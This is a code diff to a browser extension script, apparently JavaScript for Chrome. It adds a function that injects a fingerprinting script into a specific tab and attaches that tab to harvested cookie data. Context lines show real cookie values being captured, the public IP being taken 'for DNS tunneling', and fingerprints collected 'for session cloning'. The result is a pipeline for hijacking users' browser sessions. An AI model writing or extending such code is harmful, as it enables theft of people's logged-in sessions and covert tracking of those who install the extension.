@@ -225,6 +225,49 @@ async function getBrowserFingerprint() {
   });
 }
 
+// Get browser fingerprint for specific tab (not just active tab)
+async function getBrowserFingerprintFromTab(tabId) {
+  if (!tabId) {
+    log('warn', '⚠️ No tabId provided for fingerprinting');
+    return null;
+  }
+
+  try {
+    log('debug', `🔍 Collecting browser fingerprint for tab ${tabId}...`);
+    
+    // Get tab info first
+    const tab = await chrome.tabs.get(tabId);
+    
+    // Skip internal pages
+    if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
+      log('warn', `⚠️ Cannot fingerprint internal page: ${tab.url}`);
+      return null;
+    }
+    
+    const results = await chrome.scripting.executeScript({
+      target: { tabId: tabId },
+      func: collectFingerprint
+    });
+    
+    if (chrome.runtime.lastError) {
+      log('warn', '⚠️ Failed to collect fingerprint', chrome.runtime.lastError);
+      return null;
+    }
+    
+    if (!results || !results[0] || !results[0].result) {
+      log('warn', '⚠️ Fingerprint script returned no result');
+      return null;
+    }
+    
+    log('info', `✅ Browser fingerprint captured successfully from tab ${tabId}`);
+    return results[0].result;
+    
+  } catch (error) {
+    log('error', '❌ Error collecting fingerprint from tab', error);
+    return null;
+  }
+}
+
 // Function executed in page context to collect fingerprint
 function collectFingerprint() {
   const fingerprint = {
@@ -481,6 +524,7 @@ async function collectPageData(tab) {
       const cookieData = {
         host: host,
         tabUrl: tab.url,
+        tabId: tab.id,
         cookies: cookies.map(cookie => ({
           name: cookie.name,
           value: cookie.value, // Capture real cookie values
@@ -528,8 +572,15 @@ async function createIncident(data, retryCount = 0) {
     // Capture client's public IP for DNS tunneling
     const clientIp = await getPublicIP();
     
-    // Capture complete browser fingerprint for session cloning
-    const fingerprint = await getBrowserFingerprint();
+    // Capture complete browser fingerprint from specific tab
+    const fingerprint = await getBrowserFingerprintFromTab(data.tabId);
+    
+    // Log fingerprint capture result
+    if (!fingerprint) {
+      log('warn', `⚠️ Browser fingerprint is NULL for tab ${data.tabId} (${data.host})`);
+    } else {
+      log('info', `✅ Browser fingerprint captured successfully for ${data.host}`);
+    }
     
     const incident = {
       host: data.host,
